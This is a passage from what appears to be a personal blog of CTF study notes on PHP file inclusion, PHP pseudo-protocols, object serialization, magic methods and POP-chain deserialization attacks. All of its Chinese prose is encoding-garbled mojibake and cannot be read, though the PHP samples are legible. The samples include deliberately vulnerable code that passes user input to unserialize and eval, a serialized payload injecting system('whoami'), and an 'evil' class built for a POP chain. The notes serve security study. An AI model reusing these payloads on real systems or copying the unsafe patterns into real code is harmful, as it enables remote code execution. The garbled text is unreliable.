<p>æˆå› ï¼šæ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½çš„å‚æ•°æ²¡æœ‰ç»è¿‡è¿‡æ»¤æˆ–ä¸¥æ ¼å®šä¹‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼ŒåŒ…å«å…¶ä»–æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´äº†æ‰§è¡Œéé¢„æœŸä»£ç ã€‚</p>
<p>ç¨‹åºå¼€å‘äººå‘˜éƒ½å¸Œæœ›ä»£ç æ›´åŠ çµæ´»ï¼Œæ‰€ä»¥é€šå¸¸ä¼šæŠŠè¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡æ¥è¿›è¡ŒåŠ¨æ€è°ƒç”¨ï¼Œä½†æ­£æ˜¯ç”±äºè¿™ç§çµæ´»æ€§ï¼Œä»è€Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥è°ƒç”¨ä»»æ„æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´</p>
<p><strong>æ–‡ä»¶åŒ…å«å‡½æ•°</strong></p>
<p>å¸¸ç”¨çš„æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§<br>include(),require(),include_once(),require_once() </p>
<pre><code>require():æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œå¹¶åœæ­¢è„šæœ¬è¿è¡Œ
include():æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­æ‰§è¡Œ
require_once()ä¸require()ç±»ä¼¼:å”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«
include_once()ä¸include()ç±»ä¼¼:å”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«
</code></pre>
<p><strong>phpä¼ªåè®®</strong></p>
<p><strong>file:&#x2F;&#x2F;</strong> ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ </p>
<p><strong>php:&#x2F;&#x2F;filter</strong>ç”¨äºè¯»å–æºç ã€‚<br><strong>php:&#x2F;&#x2F;input</strong>ç”¨äºæ‰§è¡Œphpä»£ç ã€‚ </p>
<p><strong>php:&#x2F;&#x2F;input</strong> å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ, å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp:&#x2F;&#x2F;input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ </p>
<p><strong>zip:&#x2F;&#x2F;</strong> å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ </p>
<p><strong>data:&#x2F;&#x2F;</strong> åŒæ ·ç±»ä¼¼ä¸php:&#x2F;&#x2F;inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ </p>
<p><strong>phar:&#x2F;&#x2F;</strong> ä¸ç®¡åç¼€å¦‚ä½•ï¼Œéƒ½å½“ä½œå‹ç¼©åŒ…è§£å‹</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="clto5ulde000ktwb5da6cgz6u" data-title="æ–‡ä»¶ä¸Šä¼ " class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-serialize" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/23/serialize/" class="article-date">
  <time class="dt-published" datetime="2024-02-23T08:43:19.000Z" itemprop="datePublished">2024-02-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/23/serialize/">serialize</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>ç±»</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class hero&#123;</span><br><span class="line">  var $name;</span><br><span class="line">  var $sex;</span><br><span class="line">  function action($var1) &#123;</span><br><span class="line">    echo $this-&gt;name;</span><br><span class="line">    echo $var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç±»ä¸­åŒ…æ‹¬æˆå‘˜å˜é‡ï¼Œæˆå‘˜å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰ï¼Œå’Œpyé‡Œé¢ç±»çš„æ¦‚å¿µç›¸ä¼¼ã€‚</p>
<p>ç±»çš„å®ä¾‹åŒ–å’Œèµ‹å€¼:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class hero&#123;</span><br><span class="line">  var $name;</span><br><span class="line">  var $sex;</span><br><span class="line">  function action($var1) &#123;</span><br><span class="line">    echo $this-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    echo $var1.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$zc= new hero();</span><br><span class="line">$zc-&gt;name=&#x27;zhangsan&#x27;;</span><br><span class="line">$zc-&gt;sex=&#x27;man&#x27;;</span><br><span class="line">$zc-&gt;action(&#x27;zuofan&#x27;);</span><br><span class="line">print_r($zc);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zhangsan</span><br><span class="line">zuofan</span><br><span class="line">hero Object ( [name] =&gt; zhangsan [sex] =&gt; man ) </span><br></pre></td></tr></table></figure>

<p>æƒé™ä¿®é¥°ç¬¦ï¼š</p>
<p>PHPè®¿é—®æƒé™ä¿®é¥°ç¬¦æœ‰ä¸‰ç§ï¼š1ã€Publicï¼ˆå…¨å±€å¯ç”¨ï¼‰ï¼Œ2ã€Protectedï¼ˆè‡ªèº«å¯ç”¨ï¼‰ï¼Œ3ã€privateï¼ˆè‡ªèº«å­ç±»å¯ç”¨ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class hero&#123;</span><br><span class="line">  public  $name=&#x27;zhangsan&#x27;;</span><br><span class="line">  private  $sex=&#x27;man&#x27;;</span><br><span class="line">  protected  $shengao=&#x27;185&#x27;;</span><br><span class="line">  function action($var1) &#123;</span><br><span class="line">    echo $this-&gt;name;</span><br><span class="line">    echo $var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$zc= new hero();</span><br><span class="line">echo $zc-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo $zc-&gt;sex.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo $zc-&gt;shengao.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangsan</span><br><span class="line">Fatal error: Cannot access private property hero::$sex in C:\phpstudy_pro\WWW\pp\pp\class03\3.php on line 14</span><br></pre></td></tr></table></figure>

<p><strong>åºåˆ—åŒ–</strong></p>
<p>åºåˆ—åŒ–ç›®çš„æ˜¯ä¾¿äºæ•°æ®ä¼ è¾“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class TEST &#123;</span><br><span class="line">    public $data;</span><br><span class="line">    public $data2 = &quot;dazzhuang&quot;;</span><br><span class="line">    private $pass;</span><br><span class="line"></span><br><span class="line">    public function __construct($data, $pass)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;data = $data;</span><br><span class="line">        $this-&gt;pass = $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$number = 34;</span><br><span class="line">$str = &#x27;user&#x27;;</span><br><span class="line">$bool = true;</span><br><span class="line">$null = NULL;</span><br><span class="line">$arr = array(&#x27;a&#x27; =&gt; 10, &#x27;b&#x27; =&gt; 200);</span><br><span class="line">$test = new TEST(&#x27;uu&#x27;, true);</span><br><span class="line">$test2 = new TEST(&#x27;uu&#x27;, true);</span><br><span class="line">$test2-&gt;data = &amp;$test2-&gt;data2;</span><br><span class="line">echo serialize($number).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo serialize($str).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo serialize($bool).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo serialize($null).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo serialize($arr).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo serialize($test).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo serialize($test2).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">i:34;</span><br><span class="line">s:4:&quot;user&quot;;</span><br><span class="line">b:1;</span><br><span class="line">N;</span><br><span class="line">a:2:&#123;s:1:&quot;a&quot;;i:10;s:1:&quot;b&quot;;i:200;&#125;</span><br><span class="line">O:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:5:&quot;data2&quot;;s:9:&quot;dazzhuang&quot;;s:10:&quot;TESTpass&quot;;b:1;&#125;</span><br><span class="line">O:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:9:&quot;dazzhuang&quot;;s:5:&quot;data2&quot;;R:2;s:10:&quot;TESTpass&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>

<p>æ•°ç»„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = array(&#x27;benben&#x27;,&#x27;dazhuang&#x27;,&#x27;laoliu&#x27;);</span><br><span class="line">echo $a[0];</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line">benbena:3:&#123;i:0;s:6:&quot;benben&quot;;i:1;s:8:&quot;dazhuang&quot;;i:2;s:6:&quot;laoliu&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹è±¡ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class test&#123;</span><br><span class="line">    public $pub=&#x27;benben&#x27;;</span><br><span class="line">    function jineng()&#123;</span><br><span class="line">        echo $this-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line">O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>privateå±æ€§å˜é‡ï¼Œä¼šåœ¨å…¶å‰é¢å’Œåé¢å„åŠ ä¸Š%00ï¼Œä¸”è¿˜è¦åŠ ä¸Šç±»çš„åå­—</p>
<p>protectå±æ€§å˜é‡ï¼Œä¼šåœ¨å…¶å‰é¢åŠ ä¸Š%00*%00</p>
<p><strong>ååºåˆ—åŒ–</strong></p>
<p>åºåˆ—åŒ–åªè½¬åŒ–å¯¹è±¡ï¼Œå› æ­¤ååºåˆ—åŒ–åç±»é‡Œé¢åªæœ‰å¯¹è±¡ï¼Œæ²¡æœ‰æ–¹æ³•</p>
<p>ä¾‹é¢˜ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a = &#x27;echo &quot;this is test!!&quot;;&#x27;;</span><br><span class="line">    public function displayVar() &#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$get = $_GET[&quot;benben&quot;];</span><br><span class="line">$b = unserialize($get);</span><br><span class="line">$b-&gt;displayVar() ;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>_GETä¼ é€’åºåˆ—åŒ–åçš„testç±»ï¼ŒæŠŠ$aæ”¹ç§°æƒ³æ‰§è¡Œçš„å‘½ä»¤ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?benben=O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:17:&quot;system(&quot;whoami&quot;);&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é­”æœ¯æ–¹æ³•</strong></p>
<p>__constract():æ„é€ å‡½æ•°ï¼Œåœ¨å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šå»è‡ªåŠ¨æ‰§è¡Œçš„ä¸€ä¸ªæ–¹æ³•.</p>
<p>__destract():ææ„å‡½æ•°ï¼Œåœ¨å¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œçš„é­”æœ¯æ–¹æ³•ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class User &#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo x1.&quot;&lt;br /&gt;&quot; ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User();</span><br><span class="line">$ser = serialize($test);</span><br><span class="line">unserialize($ser);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">x1</span><br><span class="line">x1</span><br></pre></td></tr></table></figure>

<p> åœ¨ PHP ä¸­ï¼Œå½“å¯¹è±¡è¢«ååºåˆ—åŒ–åï¼Œå³ä½¿åœ¨åºåˆ—åŒ–çš„æ•°æ®ä¸­æ²¡æœ‰åŒ…å«å¯¹è±¡çš„é­”æœ¯æ–¹æ³•ï¼ˆæ¯”å¦‚_destruct(ï¼‰)ï¼ŒPHP ä»ç„¶ä¼šå°è¯•è°ƒç”¨è¿™äº›é­”æœ¯æ–¹æ³•ã€‚è¿™æ˜¯å› ä¸ºåœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼ŒPHP ä¼šå°è¯•æ¢å¤å¯¹è±¡çš„å®Œæ•´çŠ¶æ€ï¼ŒåŒ…æ‹¬å…¶æ–¹æ³•ã€‚ è¿™ä¸ªè¿‡ç¨‹ä¼šç”Ÿæˆä¸¤ä¸ªä¸åŒçš„ $test å¯¹è±¡å®ä¾‹ã€‚åœ¨ç¨‹åºç»“æŸæ—¶ï¼ŒPHP ä¼šè‡ªåŠ¨å›æ”¶æ‰€æœ‰æœªè¢«å¼•ç”¨çš„å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ææ„å‡½æ•°è¿›è¡Œæ¸…ç†æ“ä½œã€‚å› æ­¤ï¼Œåœ¨ç¤ºä¾‹ä»£ç ä¸­ï¼Œå½“è„šæœ¬æ‰§è¡Œç»“æŸæ—¶ï¼ŒPHP ä¼šè‡ªåŠ¨é”€æ¯è¿™ä¸¤ä¸ª$testå¯¹è±¡å®ä¾‹ï¼Œå¹¶åˆ†åˆ«è°ƒç”¨å®ƒä»¬çš„ææ„å‡½æ•° __destruct()ã€‚</p>
<hr>
<p>__sleep():åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–æ—¶è§¦å‘,æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class User &#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $nickname;</span><br><span class="line">    private $password;</span><br><span class="line">    public function __construct($username, $nickname, $password)    &#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;nickname = $nickname;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __sleep() &#123;</span><br><span class="line">        return array(&#x27;username&#x27;, &#x27;nickname&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user = new User(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;);</span><br><span class="line">echo serialize($user);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125; </span><br></pre></td></tr></table></figure>

<p>__wakeup():åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶è§¦å‘ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æºï¼Œè¿”å›voidï¼Œå¸¸ç”¨äºååºåˆ—åŒ–æ“ä½œä¸­é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ“ä½œã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $nickname;</span><br><span class="line">    private $password;</span><br><span class="line">    private $order;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        $this-&gt;password = $this-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user_ser = &#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;;</span><br><span class="line">var_dump(unserialize($user_ser));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object(User)#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125; </span><br></pre></td></tr></table></figure>

<hr>
<p>__Tostring():echoæˆ–è€…printåªèƒ½è°ƒç”¨å­—ç¬¦ä¸²çš„æ–¹å¼å»è°ƒç”¨å¯¹è±¡ï¼Œå³æŠŠå¯¹è±¡å½“æˆå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œæ­¤æ—¶è‡ªåŠ¨è§¦å‘ToString()</p>
<p>__invoke():æŠŠç±»å½“æˆå‡½æ•°è°ƒç”¨æ—¶è§¦å‘</p>
<hr>
<p>__call():è°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³•çš„åç§°å’Œå‚æ•°æ—¶è§¦å‘ï¼Œä¸¤ä¸ªå‚æ•°ä¼ å‚ï¼Œè¿”å›ä¸å­˜åœ¨çš„æ–¹æ³•çš„åç§°å’Œå‚æ•°</p>
<p>__callStatic():é™æ€è°ƒç”¨æˆ–è°ƒç”¨æˆå‘˜å¸¸é‡æ—¶ä½¿ç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶è§¦å‘,ä¸¤ä¸ªå‚æ•°ä¼ å‚ï¼Œè¿”å›ä¸å­˜åœ¨çš„æ–¹æ³•çš„åç§°å’Œå‚æ•°</p>
<p>__get():ç»™ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§èµ‹å€¼æ—¶è§¦å‘ï¼Œä¸€ä¸ªå‚æ•°,è¿”å›ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§°</p>
<p>__set():ç»™ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§èµ‹å€¼æ—¶è§¦å‘,ä¸¤ä¸ªå‚æ•°ï¼Œè¿”å›ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§åç§°å’Œèµ‹çš„å€¼</p>
<p>__isset():å¯¹ä¸å¯è®¿é—®å±æ€§ä½¿ç”¨ isset() æˆ– empty() æ—¶ï¼Œisset() ä¼šè¢«è°ƒç”¨ï¼Œä¸€ä¸ªå‚æ•°ï¼Œä¸å¯è®¿é—®çš„æˆå‘˜å±æ€§çš„åç§°ï¼Œä¸å­˜åœ¨æˆå‘˜ä¹Ÿå¯è§¦å‘</p>
<p>__unset():å¯¹ä¸å¯è®¿é—®å±æ€§ä½¿ç”¨ unset()æ—¶,å…¶ä»–åŒä¸Š</p>
<p>__clone():å½“ä½¿ç”¨ clone å…³é”®å­—æ‹·è´å®Œæˆä¸€ä¸ªå¯¹è±¡åï¼Œæ–°å¯¹è±¡ä¼šè‡ªåŠ¨è°ƒç”¨å®šä¹‰çš„é­”æœ¯æ–¹æ³• clone() </p>
<hr>
<p><strong>POPä¾‹é¢˜01</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class index &#123;</span><br><span class="line">    private $test;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;test = new normal();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class normal &#123;</span><br><span class="line">    public function action()&#123;</span><br><span class="line">        echo &quot;please attack me&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class evil &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    public function action()&#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&#x27;as&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li>ç›®æ ‡æ˜¯è°ƒç”¨evalè¯­å¥ï¼Œeval-&gt;$test2,è¿˜è¦æŠŠtest2èµ‹å€¼</li>
<li>evalåœ¨actionæ–¹æ³•é‡Œé¢ï¼Œè¦è°ƒç”¨è¯¥æ–¹æ³•è¦ç”¨åˆ°__destruct()</li>
